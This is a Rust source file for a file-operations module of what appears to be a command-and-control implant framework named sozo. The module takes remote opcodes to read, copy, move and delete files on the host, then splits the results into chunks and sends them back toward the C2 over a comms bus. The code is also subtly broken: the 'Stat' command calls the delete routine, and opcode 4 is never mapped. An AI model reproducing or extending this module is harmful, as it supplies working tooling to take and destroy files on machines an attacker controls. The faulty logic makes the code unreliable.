use sozo_api::plugin::{HostVTable, ModuleVTable, PollStatus};
use sozo_api::{ModuleIdentity, sozo_debug};
use std::ffi::c_void;
use std::io;
use std::sync::Mutex;
use std::sync::mpsc::{Receiver, SyncSender, sync_channel};
mod cat;
mod copy_and_move;
mod remove;

const MAX_PATH_LEN: usize = 512;

#[repr(u8)]
#[derive(Copy, Clone, Debug)]
pub enum FileOpsErrors {
    Success,
    Critical,
    PermissionDenied,
    InvalidArguments,
    PathNotFound,
    ReadError,
    NotRegularFile,
    UnableToOpenFile,
    UnableToEnumerate,
    Unknown,
}

impl From<io::Error> for FileOpsErrors {
    fn from(e: io::Error) -> Self {
        match e.kind() {
            io::ErrorKind::NotFound => FileOpsErrors::PathNotFound,
            io::ErrorKind::PermissionDenied => FileOpsErrors::PermissionDenied,
            _ => FileOpsErrors::Unknown,
        }
    }
}

#[repr(u8)]
#[derive(Copy, Clone, PartialEq, Eq)]
enum FileOpsCommands {
    Cat,
    Copy,
    Remove,
    Move,
    Stat,
}

impl TryFrom<u8> for FileOpsCommands {
    type Error = ();

    fn try_from(value: u8) -> Result<Self, Self::Error> {
        match value {
            0 => Ok(FileOpsCommands::Cat),
            1 => Ok(FileOpsCommands::Copy),
            2 => Ok(FileOpsCommands::Remove),
            3 => Ok(FileOpsCommands::Move),
            _ => Err(()),
        }
    }
}

struct FileOperations {
    rx: Mutex<Receiver<Vec<u8>>>,
    tx: SyncSender<Vec<u8>>,
}

impl FileOperations {
    fn new() -> FileOperations {
        const MAX_MSG_BUFFER: usize = 1024;
        let (tx, rx) = sync_channel::<Vec<u8>>(MAX_MSG_BUFFER);

        FileOperations {
            rx: Mutex::new(rx),
            tx,
        }
    }

    fn send_response(
        &self,
        vtable: *const HostVTable,
        retcode: FileOpsErrors,
        response: Option<Vec<u8>>,
    ) -> bool {
        /*
         * total size   : u64
         * retcode      : u8
         * chunk counter: u16
         * total chunks : u16
         * data len     : u32
         */
        const INIT_RESPONSE_HDR_LEN: u32 = 17;

        /*
         * chunk counter: u16
         * total chunks : u16
         * data len     : u32
         */
        const CONT_RESPONSE_HDR_LEN: u32 = 8;

        /* Maximum length of `data` buffer within a bus message */
        const MAXIMUM_DATA_SIZE: u32 = 4096;

        /* extract any data, if applicable and determine total number of chunks that will be sent */
        let data = response.unwrap_or_default();

        let total_chunks: u16 = if data.len()
            <= (MAXIMUM_DATA_SIZE - INIT_RESPONSE_HDR_LEN) as usize
        {
            1
        } else {
            let remaining = data.len() - (MAXIMUM_DATA_SIZE - INIT_RESPONSE_HDR_LEN) as usize;
            (1 + remaining.div_ceil((MAXIMUM_DATA_SIZE - CONT_RESPONSE_HDR_LEN) as usize)) as u16
        };

        let remote_identity = ModuleIdentity::SHELL.0;

        let mut offset = 0;
        for chunk_index in 0..total_chunks {
            let chunk_len = if 0 == chunk_index {
                MAXIMUM_DATA_SIZE - INIT_RESPONSE_HDR_LEN
            } else {
                MAXIMUM_DATA_SIZE - CONT_RESPONSE_HDR_LEN
            };

            let end = (offset + chunk_len as usize).min(data.len());
            let chunk = &data[offset..end];
            offset = end;

            let mut chunk_msg: Vec<u8> = Vec::new();

            if 0 == chunk_index {
                if chunk_msg
                    .try_reserve(INIT_RESPONSE_HDR_LEN as usize + chunk.len())
                    .is_err()
                {
                    return false;
                }

                /*
                 * total size is the actual response data len excluding any packaged headers
                 * chunks are used in conjunction as a separate tracking mechanism by the C2 for data validation
                 */
                chunk_msg.extend_from_slice(&(data.len() as u64).to_be_bytes());
                chunk_msg.extend_from_slice(&(retcode as u8).to_be_bytes());
            } else {
                if chunk_msg
                    .try_reserve(CONT_RESPONSE_HDR_LEN as usize + chunk.len())
                    .is_err()
                {
                    return false;
                }
            }

            chunk_msg.extend_from_slice(&chunk_index.to_be_bytes());
            chunk_msg.extend_from_slice(&total_chunks.to_be_bytes());
            chunk_msg.extend_from_slice(&(chunk.len() as u32).to_be_bytes());
            chunk_msg.extend_from_slice(chunk);

            unsafe {
                if ((*vtable).send_bus_message)(
                    (*vtable).context,
                    ModuleIdentity::COMMS.0,
                    &remote_identity,
                    chunk_msg.as_ptr() as *const u8,
                    chunk_msg.len(),
                ) == false as u8
                {
                    return false;
                }
            }
        }

        true
    }
}

unsafe extern "C" fn plugin_init() -> *mut c_void {
    Box::into_raw(Box::new(FileOperations::new())) as *mut c_void
}

unsafe extern "C" fn plugin_destroy(instance: *mut c_void) {
    drop(unsafe { Box::from_raw(instance as *mut FileOperations) });
}

unsafe extern "C" fn plugin_run(instance: *mut c_void, host_vtable: *const HostVTable) {
    if instance.is_null() || host_vtable.is_null() {
        return;
    }

    let instance = unsafe { &*(instance as *const FileOperations) };
    let host_vtable = unsafe { &*host_vtable };

    let rx = match instance.rx.try_lock() {
        Ok(guard) => guard,
        Err(_) => return,
    };

    sozo_debug!(
        "FileOperations::plugin_run",
        "waiting for inbound file_ops requests"
    );

    loop {
        let result =
            PollStatus::try_from(unsafe { (host_vtable.poll_objects)(host_vtable.context) })
                .unwrap();

        match result {
            PollStatus::Cancelled => break,
            PollStatus::InboundMessage => {
                let Ok(msg) = rx.try_recv() else { break };

                if msg.is_empty() {
                    sozo_debug!("FileOperations::plugin_run", "inbound message was empty");
                    break;
                }

                let Ok(opcode) = FileOpsCommands::try_from(msg[0]) else {
                    sozo_debug!(
                        "FileOperations::plugin_run",
                        "invalid opcode received from message"
                    );
                    break;
                };

                let result = match opcode {
                    FileOpsCommands::Cat => cat::read_file_contents(&msg[size_of::<u8>()..]),
                    FileOpsCommands::Copy => copy_and_move::copy_file(&msg[size_of::<u8>()..]),
                    FileOpsCommands::Remove => remove::remove_path(&msg[size_of::<u8>()..]),
                    FileOpsCommands::Move => copy_and_move::move_file(&msg[size_of::<u8>()..]),
                    FileOpsCommands::Stat => remove::remove_path(&msg[size_of::<u8>()..]),
                };

                match result {
                    Err(FileOpsErrors::Critical) => break,
                    Ok(data) => {
                        if !instance.send_response(host_vtable, FileOpsErrors::Success, Some(data))
                        {
                            break;
                        }
                    }
                    Err(err) => {
                        if !instance.send_response(host_vtable, err, None) {
                            break;
                        }
                    }
                }
            }
        }
    }
}

unsafe extern "C" fn plugin_enqueue(instance: *mut c_void, msg: *const u8, len: usize) -> u8 {
    if instance.is_null() || msg.is_null() {
        return false as u8;
    }

    let slice_msg = unsafe { std::slice::from_raw_parts(msg, len) };

    let mut msg: Vec<u8> = Vec::new();
    if msg.try_reserve(slice_msg.len()).is_err() {
        return false as u8;
    }

    msg.extend_from_slice(slice_msg);

    unsafe {
        (&*(instance as *const FileOperations))
            .tx
            .try_send(msg)
            .is_ok() as u8
    }
}

static VTABLE: ModuleVTable = ModuleVTable {
    init: plugin_init,
    destroy: plugin_destroy,
    run: plugin_run,
    enqueue: plugin_enqueue,
};

#[unsafe(no_mangle)]
pub unsafe extern "C" fn module_entry() -> *const ModuleVTable {
    &VTABLE
}

// Once we move maximum size into the sozo api, modify this accordingly
// try to cat a directory and/or copy to/from dir -- check errors may need to be more granular rather than unknown
// test rm functinality -- should return immediately on any errors
// basically do some tests, etc

// using impl for io error -- update all commands and rustix commands to map to that for ease rather than mutliple large match statements
